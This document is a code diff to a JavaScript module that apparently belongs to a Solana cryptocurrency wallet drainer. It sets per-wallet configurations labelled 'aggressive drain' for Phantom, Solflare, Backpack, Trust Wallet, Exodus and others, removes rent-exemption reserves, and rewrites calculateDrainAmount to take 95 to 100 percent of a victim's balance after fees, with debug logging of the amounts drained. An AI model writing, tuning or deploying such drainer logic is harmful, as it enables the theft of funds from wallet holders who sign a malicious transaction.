@@ -38,32 +38,33 @@ export const WALLET_FEE_CONFIGS = {
   // Default fallback configuration
   default: {
     feeBuffer: 10000,           // 0.00001 SOL - Conservative default
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption
-    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer (standardized)
+    rentExemptionMinimum: 890880, // 0.00089088 SOL - Actual Solana rent exemption
+    safetyBuffer: 50000,      // 0.00005 SOL - Much larger safety buffer for rent exemption
     priority: 'standard',
     maxInstructions: 10,        // Maximum instructions per transaction
     supportsComputeBudget: true // Whether wallet supports compute budget instructions
   },
   
-  // Phantom Wallet - High priority, robust (2025 optimized)
-  phantom: {
-    feeBuffer: 10000,           // 0.00001 SOL - Optimized for 2025 standards
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 5000,         // 0.000005 SOL - Minimal safety buffer
-    priority: 'high',
-    maxInstructions: 15,
-    supportsComputeBudget: true,
-    connectionTimeout: 30000,   // 30 seconds
-    signingTimeout: 60000,      // 60 seconds
-    computeUnitLimit: 200000,   // Standard compute units (2025)
-    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
-  },
+  // Phantom Wallet - Ultra aggressive drain with minimal reserve (2025 optimized)
+      phantom: {
+        feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
+        rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+        safetyBuffer: 400000,       // 0.0004 SOL - Increased reserve for Phantom stability
+        drainPercentage: 0.95,      // 95% drain - leave 5% for safety
+        priority: 'high',
+        maxInstructions: 15,
+        supportsComputeBudget: true,
+        connectionTimeout: 30000,   // 30 seconds
+        signingTimeout: 60000,      // 60 seconds
+        computeUnitLimit: 200000,   // Standard compute units (2025)
+        computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
+      },
   
-  // Solflare Wallet - Standard priority, efficient (2025 optimized)
+  // Solflare Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
   solflare: {
     feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 2000,         // 0.000002 SOL - Minimal safety buffer
+    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
     priority: 'standard',
     maxInstructions: 10,
     supportsComputeBudget: true,
@@ -73,11 +74,11 @@ export const WALLET_FEE_CONFIGS = {
     computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
   },
   
-  // Backpack Wallet - High priority, xNFT enabled (2025 optimized)
+  // Backpack Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
   backpack: {
-    feeBuffer: 8000,           // 0.000008 SOL - Optimized for 2025 standards
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer
+    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
+    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
     priority: 'high',
     maxInstructions: 12,
     supportsComputeBudget: true,
@@ -87,11 +88,11 @@ export const WALLET_FEE_CONFIGS = {
     computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
   },
   
-  // Glow Wallet - Mobile-first, high priority (2025 optimized)
+  // Glow Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
   glow: {
-    feeBuffer: 8000,           // 0.000008 SOL - Optimized for 2025 standards
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer
+    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
+    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
     priority: 'high',
     maxInstructions: 10,
     supportsComputeBudget: false, // Mobile wallets may not support compute budget
@@ -101,25 +102,24 @@ export const WALLET_FEE_CONFIGS = {
     computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
   },
   
-  // Trust Wallet - Binance's wallet, high priority (2025 optimized)
+  // Trust Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
   trustwallet: {
-    feeBuffer: 8000,           // 0.000008 SOL - Optimized for 2025 standards
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer
+    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
+    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
     priority: 'high',
     maxInstructions: 10,
     supportsComputeBudget: false, // May not support compute budget
-    connectionTimeout: 30000,   // 30 seconds
-    signingTimeout: 60000,      // 60 seconds
+    // No timeouts - Trust Wallet handles its own timeouts
     computeUnitLimit: 200000,   // Standard compute units (2025)
     computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
   },
   
-  // Exodus Wallet - Multi-chain, high priority (2025 optimized)
+  // Exodus Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
   exodus: {
-    feeBuffer: 8000,           // 0.000008 SOL - Optimized for 2025 standards
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer
+    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
+    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
     priority: 'high',
     maxInstructions: 10,
     supportsComputeBudget: false, // Multi-chain wallets may not support compute budget
@@ -129,11 +129,11 @@ export const WALLET_FEE_CONFIGS = {
     computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
   },
   
-  // Unknown wallet - Conservative fallback (2025 optimized)
+  // Unknown wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
   unknown: {
-    feeBuffer: 10000,           // 0.00001 SOL - Conservative but optimized for 2025
-    rentExemptionMinimum: 890000, // 0.00089 SOL - Standard Solana rent exemption (2025)
-    safetyBuffer: 5000,        // 0.000005 SOL - Minimal safety buffer
+    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
+    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
+    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
     priority: 'conservative',
     maxInstructions: 5,         // Conservative limit
     supportsComputeBudget: false, // Assume no support
@@ -216,7 +216,7 @@ export async function calculateTransactionFee(connection, transaction, blockhash
     }
     
     // Add wallet-specific fee buffer
-    const walletFeeBuffer = walletConfig.feeBuffer || 0;
+    const walletFeeBuffer = walletConfig.feeBuffer ?? 0;
     const safetyBuffer = Math.ceil(actualFee * STANDARD_FEE_CONFIG.SAFETY_MARGIN_PERCENTAGE);
     const totalFee = Math.max(actualFee + safetyBuffer + walletFeeBuffer, STANDARD_FEE_CONFIG.MINIMUM_FEE);
     
@@ -241,7 +241,7 @@ export async function calculateTransactionFee(connection, transaction, blockhash
     
     // Use conservative default with wallet-specific safety buffer
     const baseFee = STANDARD_FEE_CONFIG.BASE_FEE;
-    const walletFeeBuffer = walletConfig.feeBuffer || 0;
+    const walletFeeBuffer = walletConfig.feeBuffer ?? 0;
     const safetyBuffer = STANDARD_FEE_CONFIG.SAFETY_BUFFER;
     const totalFee = baseFee + safetyBuffer + walletFeeBuffer;
     
@@ -282,8 +282,8 @@ export function checkFeeAdequacy(balance, feeInfo, walletType = 'default') {
     }
     
     // Use wallet-specific configurations
-    const rentExemptionMinimum = walletConfig.rentExemptionMinimum || 890000;
-    const safetyBuffer = walletConfig.safetyBuffer || 100000;
+    const rentExemptionMinimum = walletConfig.rentExemptionMinimum ?? 0;
+    const safetyBuffer = walletConfig.safetyBuffer ?? 50000;
     const totalReserve = rentExemptionMinimum + safetyBuffer;
   const totalRequired = feeInfo.totalFee + totalReserve;
   
@@ -347,46 +347,55 @@ export function calculateDrainAmount(balance, feeInfo, walletType = 'default') {
     }
     
     // Use wallet-specific rent and safety configurations
-    const rentExemptionMinimum = walletConfig.rentExemptionMinimum || 890000;
-    const safetyBuffer = walletConfig.safetyBuffer || 100000;
+    const rentExemptionMinimum = walletConfig.rentExemptionMinimum ?? 0;
+    const safetyBuffer = walletConfig.safetyBuffer ?? 400000;
     const minimumReserve = rentExemptionMinimum + safetyBuffer;
+    
+    console.log(`[DRAIN_CALC_DEBUG] Wallet: ${normalizedWalletType}, Rent exemption: ${rentExemptionMinimum}, Safety buffer: ${safetyBuffer}, Total reserve: ${minimumReserve}`);
     const totalRequired = feeInfo.totalFee + minimumReserve;
     
     // Calculate drain amount using DRAIN_PERCENTAGE from STANDARD_FEE_CONFIG
     
-    // Check if balance is sufficient for fees and reserves
-    if (balance < totalRequired) {
-    return {
-      canDrain: false,
-      reason: 'INSUFFICIENT_FUNDS_FOR_FEES',
-      balance: balance,
-        totalRequired: totalRequired,
-        shortfall: totalRequired - balance,
+    // Calculate available amount for draining (after transaction fees)
+    const availableForDrain = balance - feeInfo.totalFee;
+    
+    // Check if available amount is sufficient for minimum reserves
+    if (availableForDrain < minimumReserve) {
+      return {
+        canDrain: false,
+        reason: 'INSUFFICIENT_FUNDS_AFTER_FEES',
+        balance: balance,
+        availableForDrain: availableForDrain,
+        minimumReserve: minimumReserve,
+        shortfall: minimumReserve - availableForDrain,
         walletType: normalizedWalletType,
         breakdown: {
           originalBalance: balance,
           feeRequired: feeInfo.totalFee,
+          availableForDrain: availableForDrain,
           minimumReserve: minimumReserve,
-      totalRequired: totalRequired,
-      shortfall: totalRequired - balance
+          shortfall: minimumReserve - availableForDrain
         }
       };
     }
     
-    // Calculate available amount for draining (after transaction fees and reserves)
-    const availableForDrain = balance - feeInfo.totalFee;
-    
-    // Calculate drain amount using DRAIN_PERCENTAGE from STANDARD_FEE_CONFIG
+    // Calculate drain amount using wallet-specific or standard percentage
     let drainAmount;
-    const drainPercentage = STANDARD_FEE_CONFIG.DRAIN_PERCENTAGE; // 1.0 = 100%
+    const walletDrainPercentage = walletConfig.drainPercentage;
+    const drainPercentage = walletDrainPercentage ?? STANDARD_FEE_CONFIG.DRAIN_PERCENTAGE; // Use wallet-specific or default 100%
+    
+    console.log(`[DRAIN_CALC_DEBUG] Balance: ${balance}, Available: ${availableForDrain}, Minimum reserve: ${minimumReserve}`);
+    console.log(`[DRAIN_CALC_DEBUG] Wallet: ${normalizedWalletType}, Drain percentage: ${(drainPercentage * 100).toFixed(1)}%`);
     
     if (availableForDrain <= minimumReserve) {
       // Not enough to drain anything while maintaining minimum reserves
       drainAmount = 0;
+      console.log(`[DRAIN_CALC_DEBUG] Not enough to drain - available (${availableForDrain}) <= reserve (${minimumReserve})`);
     } else {
       // Drain percentage of remaining balance after minimum reserves
       const drainableAmount = availableForDrain - minimumReserve;
       drainAmount = Math.floor(drainableAmount * drainPercentage);
+      console.log(`[DRAIN_CALC_DEBUG] Drainable: ${drainableAmount}, Drain amount: ${drainAmount}, Remaining: ${balance - feeInfo.totalFee - drainAmount}`);
     }
     
     // Drain calculation completed
